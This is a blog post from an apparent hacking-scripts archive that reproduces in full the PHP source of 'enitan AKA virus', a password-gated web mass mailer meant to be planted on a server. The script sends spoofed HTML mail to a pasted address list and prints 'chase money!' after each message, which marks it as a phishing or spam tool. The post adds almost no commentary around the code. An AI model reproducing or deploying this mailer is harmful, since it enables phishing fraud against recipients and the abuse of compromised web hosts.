---
id: 114
title: enitan AKA virus
author: admin
layout: post
guid: http://hackingscripts.com/?p=114
permalink: /enitan-aka-virus/
categories:
  - enitan AKA virus
  - PHP
tags:
  - enitan AKA virus
  - PHP
---
This file was called &#8216;enitan AKA virus&#8217;, and this is the content of the title tag in the script, so I guess that&#8217;s what it&#8217;s called.


### Enitan AKA virus Source Code

{% highlight php %}<?php
@session_start();
@set_time_limit(0);
//PASSWORD CONFIGURATION
@$pass = $_POST['pass'];
$chk_login = true;
$password = "kill";
//END CONFIGURATION
if($pass == $password)
{
$_SESSION['nst'] = "$pass";
}
if($chk_login == true)
{
if(!isset($_SESSION['nst']) or $_SESSION['nst'] != $password)
{
die("
 &lt;title&gt;.:|enitan AKA Virus|:.&lt;/title&gt;
 &lt;center&gt;
 &lt;table border=0 cellpadding=0 cellspacing=0 width=100% height=100%&gt;
 &lt;tr&gt;&lt;td valign=middle align=center&gt;
 &lt;table width=100 bgcolor=black border=6 bordercolor=#444444&gt;
   &lt;tr&gt;&lt;td&gt;
 &lt;font size=1 face=verdana&gt;&lt;center&gt;
 &lt;b&gt;&lt;/font&gt;&lt;/a&gt;&lt;br&gt;&lt;/b&gt;
 &lt;/center&gt;
 &lt;form method=post&gt;
 &lt;font size=1 face=verdana
color=red&gt;&lt;strong&gt;&lt;center&gt;Mailer&lt;/center&gt;&lt;/strong&gt;&lt;br&gt;
 &lt;input type=password name=pass size=30&gt;
 &lt;/form&gt;
 &lt;b&gt;Host:&lt;/b&gt; ".$_SERVER["HTTP_HOST"]."&lt;br&gt;
 &lt;b&gt;IP:&lt;/b&gt; ".gethostbyname($_SERVER["HTTP_HOST"])."&lt;br&gt;
 &lt;b&gt;Your ip:&lt;/b&gt; ".$_SERVER["REMOTE_ADDR"]."
 &lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 ");
}
}
if(isset($_POST['action'] ) ){
$action=$_POST['action'];
$message=$_POST['message'];
$emaillist=$_POST['emaillist'];
$from=$_POST['from'];
$replyto=$_POST['replyto'];
$subject=$_POST['subject'];
$realname=$_POST['realname'];
$file_name=$_POST['file'];
$contenttype=$_POST['contenttype'];
       $message = urlencode($message);
       $message = ereg_replace("%5C%22", "%22", $message);
       $message = urldecode($message);
       $message = stripslashes($message);
       $subject = stripslashes($subject);
}
?>
&lt;html&gt;
&lt;head&gt;
&lt;title&gt;.:: mass mailer ::.&lt;/title&gt;
&lt;meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1"&gt;
&lt;style type="text/css"&gt;
&lt;!--
.style1 {
       font-family: Geneva, Arial, Helvetica, sans-serif;
       font-size: 12px;
}
--&gt;
&lt;/style&gt;
&lt;style type="text/css"&gt;
&lt;!--
.style1 {
       font-size: 20px;
       font-family: Geneva, Arial, Helvetica, sans-serif;
}
body {
   background-color: #000000;
}
.style2 {font-family: Georgia, "Times New Roman", Times, serif}
.style3 {
   color: #FF0000;
   font-weight: bold;
}
.style4 {color: #999999}
--&gt;
&lt;/style&gt;
&lt;/head&gt;
&lt;body text="#ffffff"&gt;
&lt;span class="style1"&gt;
&lt;center&gt;&lt;br&gt;
 &lt;SPAN lang=ar-sa&gt;&lt;FONT style="FONT-SIZE: 70pt"
face=Webdings
color=#ff0000&gt;!&lt;/FONT&gt;&lt;/SPAN&gt;&lt;/FONT&gt;&lt;/br&gt;
&lt;/center&gt;
&lt;br&gt;&lt;/span&gt;&lt;/p&gt;
&lt;form name="form1" method="post" action="" enctype="multipart/form-data"&gt;
       &lt;input type="hidden" name="action" value="send"&gt;
       &lt;br&gt;
 &lt;table width="100%" border="0"&gt;
   &lt;tr&gt;
     &lt;td width="10%"&gt;
       &lt;div align="right"&gt;&lt;font size="-3" face="Verdana, Arial,
Helvetica, sans-serif"&gt;Email:&lt;/font&gt;&lt;/div&gt;
     &lt;/td&gt;
     &lt;td width="18%"&gt;&lt;font size="-3" face="Verdana, Arial, Helvetica,
sans-serif"&gt;
       &lt;input type="text" name="from" value="<? print $from; ?>"
size="30"&gt;
       &lt;/font&gt;&lt;/td&gt;
     &lt;td width="31%"&gt;
       &lt;div align="right"&gt;&lt;font size="-3" face="Verdana, Arial,
Helvetica, sans-serif"&gt;Name:&lt;/font&gt;&lt;/div&gt;
     &lt;/td&gt;
     &lt;td width="41%"&gt;&lt;font size="-3" face="Verdana, Arial, Helvetica,
sans-serif"&gt;
       &lt;input type="text" name="realname" value="<? print $realname;
?>" size="30"&gt;
       &lt;/font&gt;&lt;/td&gt;
   &lt;/tr&gt;
   &lt;tr&gt;
     &lt;td width="10%"&gt;
       &lt;div align="right"&gt;&lt;font size="-3" face="Verdana, Arial,
Helvetica, sans-serif"&gt;Reply:&lt;/font&gt;&lt;/div&gt;
     &lt;/td&gt;
     &lt;td width="18%"&gt;&lt;font size="-3" face="Verdana, Arial, Helvetica,
sans-serif"&gt;
       &lt;input type="text" name="replyto" value="<? print $replyto;
?>" size="30"&gt;
       &lt;/font&gt;&lt;/td&gt;
     &lt;td width="31%"&gt;
       &lt;div align="right"&gt;&lt;font size="-3" face="Verdana, Arial,
Helvetica, sans-serif"&gt;Attach
         File:&lt;/font&gt;&lt;/div&gt;
     &lt;/td&gt;
     &lt;td width="41%"&gt;&lt;font size="-3" face="Verdana, Arial, Helvetica,
sans-serif"&gt;
       &lt;input type="file" name="file" size="30"&gt;
       &lt;/font&gt;&lt;/td&gt;
   &lt;/tr&gt;
   &lt;tr&gt;
     &lt;td width="10%"&gt;
       &lt;div align="right"&gt;&lt;font size="-3" face="Verdana, Arial,
Helvetica, sans-serif"&gt;Subject:&lt;/font&gt;&lt;/div&gt;
     &lt;/td&gt;
     &lt;td colspan="3"&gt;&lt;font size="-3" face="Verdana, Arial, Helvetica,
sans-serif"&gt;
       &lt;input type="text" name="subject" value="<? print $subject;
?>" size="66"&gt;
       &lt;/font&gt;&lt;/td&gt;
   &lt;/tr&gt;
   &lt;tr&gt;
     &lt;td width="10%" valign="top"&gt;
       &lt;div align="right"&gt;&lt;font size="-3" face="Verdana, Arial,
Helvetica, sans-serif"&gt;Mail:&lt;/font&gt;&lt;/div&gt;
     &lt;/td&gt;
     &lt;td width="18%" valign="top"&gt;&lt;font size="-3" face="Verdana,
Arial, Helvetica,
sans-serif"&gt;
       &lt;textarea name="message" cols="50" rows="10"&gt;<? print
$message; ?>&lt;/textarea&gt;
       &lt;br&gt;
       &lt;input type="radio" name="contenttype" value="plain"&gt;
       Text
       &lt;input name="contenttype" type="radio" value="html" checked&gt;
       HTML
       &lt;input type="submit" value="BomB WellA"&gt;
       &lt;/font&gt;&lt;/td&gt;
     &lt;td width="31%" valign="top"&gt;
       &lt;div align="right"&gt;
         &lt;font face="Verdana, Arial,
Helvetica, sans-serif" size="-3"&gt;Mail  to:&lt;/font&gt;&lt;/div&gt;
     &lt;/td&gt;
     &lt;td width="41%" valign="top"&gt;&lt;font size="-3" face="Verdana,
Arial, Helvetica, sans-serif"&gt;
       &lt;textarea name="emaillist" cols="30" rows="10"&gt;<? print
$emaillist; ?>&lt;/textarea&gt;&lt;/font&gt;&lt;/td&gt;
   &lt;/tr&gt;
 &lt;/table&gt;
&lt;/form&gt;
<?
if ($action){
       if (!$from && !$subject && !$message && !$emaillist){
       print "Please complete all fields before sending your message.";
       exit;
   }
   $allemails = split("\n", $emaillist);
           $numemails = count($allemails);
         for($x=0; $x&lt;$numemails; $x++){
               $to = $allemails[$x];
               if ($to){
               $to = ereg_replace(" ", "", $to);
               $message = ereg_replace("&email&", $to, $message);
               $subject = ereg_replace("&email&", $to, $subject);
               print " $to.......";
               flush();
               $header = "From: $realname &lt;$from&gt;\r\nReply-To: $replyto\r\n";
               $header .= "MIME-Version: 1.0\r\n";
           If ($file_name) $header .= "Content-Type: multipart/mixed;
boundary=$uid\r\n";
             If ($file_name) $header .= "--$uid\r\n";
               $header .= "Content-Type: text/$contenttype\r\n";
               $header .= "Content-Transfer-Encoding: 8bit\r\n\r\n";
               $header .= "$message\r\n";
           If ($file_name) $header .= "--$uid\r\n";
           If ($file_name) $header .= "Content-Type: $file_type;
name=\"$file_name\"\r\n";
           If ($file_name) $header .= "Content-Transfer-Encoding: base64\r\n";
           If ($file_name) $header .= "Content-Disposition:
attachment; filename=\"$file_name\"\r\n\r\n";
           If ($file_name) $header .= "$content\r\n";
           If ($file_name) $header .= "--$uid--";
               mail($to, $subject, "", $header);
               print "chase money!&lt;br&gt;";
               flush();
               }
               }
}
?>
&lt;style type="text/css"&gt;
&lt;!--
.style1 {
   font-size: 20px;
   font-family: Geneva, Arial, Helvetica, sans-serif;
}
--&gt;
&lt;/style&gt;&lt;center&gt;
&lt;p class="style1 style2 style3 style4"&gt;&lt;p class="style1"&gt;PHP Mailer&lt;br&gt;
 &copy enitan4evil@hotmail.com&lt;br&gt;
     &lt;/p&gt;  &lt;/p&gt;
&lt;/center&gt;
<?php
if(isset($_POST['action']) && $numemails !==0 ){echo
"&lt;script&gt;alert('Sending Completed\\r\\nTotal Email
$numemails\\r\\n-Shout Lastborn and Hustle On!');
&lt;/script&gt;";}
?>
&lt;/body&gt;
&lt;/html&gt;
{% endhighlight %}


### Enitan AKA virus screenshot

[<img src="{{ site.baseurl }}/wp-content/uploads/2014/01/enitan.png" alt="enitan aka virus screenshot" width="411" height="293" class="aligncenter size-full wp-image-352" />][1]

 [1]: {{ site.baseurl }}/wp-content/uploads/2014/01/enitan.png